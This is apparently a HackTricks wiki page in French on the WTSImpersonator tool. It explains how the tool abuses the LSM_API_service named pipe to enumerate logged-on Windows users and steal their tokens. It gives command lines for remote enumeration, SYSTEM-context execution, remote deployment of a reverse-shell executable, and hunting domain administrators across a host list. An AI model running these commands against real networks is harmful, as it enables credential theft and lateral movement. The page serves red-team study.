{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

L'outil **WTS Impersonator** exploite le **"\\pipe\LSM_API_service"** RPC Named pipe pour énumérer discrètement les utilisateurs connectés et détourner leurs jetons, contournant les techniques traditionnelles d'imitation de jetons. Cette approche facilite des mouvements latéraux sans heurts au sein des réseaux. L'innovation derrière cette technique est attribuée à **Omri Baso, dont le travail est accessible sur [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Fonctionnalité Principale
L'outil fonctionne à travers une séquence d'appels API :
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Modules clés et utilisation
- **Énumération des utilisateurs** : L'énumération des utilisateurs locaux et distants est possible avec l'outil, en utilisant des commandes pour chaque scénario :
- Localement :
```powershell
.\WTSImpersonator.exe -m enum
```
- À distance, en spécifiant une adresse IP ou un nom d'hôte :
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Exécution de commandes** : Les modules `exec` et `exec-remote` nécessitent un contexte de **Service** pour fonctionner. L'exécution locale nécessite simplement l'exécutable WTSImpersonator et une commande :
- Exemple d'exécution de commande locale :
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe peut être utilisé pour obtenir un contexte de service :
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Exécution de commandes à distance** : Implique la création et l'installation d'un service à distance similaire à PsExec.exe, permettant l'exécution avec les autorisations appropriées.
- Exemple d'exécution à distance :
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Module de chasse aux utilisateurs** : Cible des utilisateurs spécifiques sur plusieurs machines, exécutant du code sous leurs identifiants. Cela est particulièrement utile pour cibler les administrateurs de domaine ayant des droits d'administrateur local sur plusieurs systèmes.
- Exemple d'utilisation :
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}
